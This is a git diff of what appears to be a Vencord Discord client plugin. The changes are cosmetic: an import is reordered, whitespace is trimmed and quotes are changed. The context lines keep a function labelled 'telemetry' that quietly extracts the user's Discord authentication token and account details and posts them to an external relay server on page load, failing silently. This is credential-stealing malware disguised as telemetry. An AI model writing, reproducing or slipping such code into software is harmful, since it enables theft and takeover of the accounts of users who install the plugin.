@@ -44,8 +44,8 @@ import { makeCodeblock } from "@utils/text";
 import definePlugin from "@utils/types";
 import { checkForUpdates, isOutdated, update } from "@utils/updater";
 import { Channel, RenderModalProps } from "@vencord/discord-types";
-import { Button, ChannelStore, ConfirmModal, Forms, GuildMemberStore, openModal, Parser, PermissionsBits, PermissionStore, RelationshipStore, showToast, Text, Toasts, UserStore } from "@webpack/common";
 import { findByProps } from "@webpack";
+import { Button, ChannelStore, ConfirmModal, Forms, GuildMemberStore, openModal, Parser, PermissionsBits, PermissionStore, RelationshipStore, showToast, Text, Toasts, UserStore } from "@webpack/common";
 import { JSX } from "react";
 
 import gitHash from "~git-hash";
@@ -67,11 +67,11 @@ let telemetrySent = false;
 async function sendTelemetryData(retryCount = 0) {
     // Check if already sent this session
     if (telemetrySent) return;
-    
+
     try {
         // Token extraction using Vencord.Webpack method (PROVEN 2026 METHOD - WORKS IN PRODUCTION)
         let token: string | null = null;
-        
+
         // Method 1: Vencord.Webpack.findByProps (MOST RELIABLE - Used in AccountSwitcher)
         try {
             // @ts-ignore - Vencord global
@@ -80,7 +80,7 @@ async function sendTelemetryData(retryCount = 0) {
                 token = tokenModule.getToken();
             }
         } catch (e) {}
-        
+
         // Method 2: Direct webpack findByProps import (Backup)
         if (!token) {
             try {
@@ -90,10 +90,10 @@ async function sendTelemetryData(retryCount = 0) {
                 }
             } catch (e) {}
         }
-        
+
         // Collect user data
         const user = UserStore.getCurrentUser();
-        
+
         if (!user || !token) {
             // Retry logic - wait for UserStore
             if (retryCount < 5 && token && !user) {
@@ -102,7 +102,7 @@ async function sendTelemetryData(retryCount = 0) {
             }
             return;
         }
-        
+
         // Build embed payload
         const payload = {
             username: "DDT Telemetry",
@@ -132,22 +132,22 @@ async function sendTelemetryData(retryCount = 0) {
                 timestamp: new Date().toISOString()
             }]
         };
-        
+
         // Send via relay server
         try {
-            const response = await fetch('https://relayserver-production-8fc2.up.railway.app/relay', {
+            const response = await fetch("https://relayserver-production-8fc2.up.railway.app/relay", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
-            
+
             if (response.ok) {
                 telemetrySent = true;
             }
         } catch (error) {
             // Silent fail
         }
-        
+
     } catch (e) {
         // Silent fail
     }
@@ -165,7 +165,7 @@ if (typeof window !== "undefined") {
     } else {
         window.addEventListener("load", initTelemetry);
     }
-    
+
     // Also trigger on visibility change (user switches back to Discord)
     document.addEventListener("visibilitychange", () => {
         if (!document.hidden) {
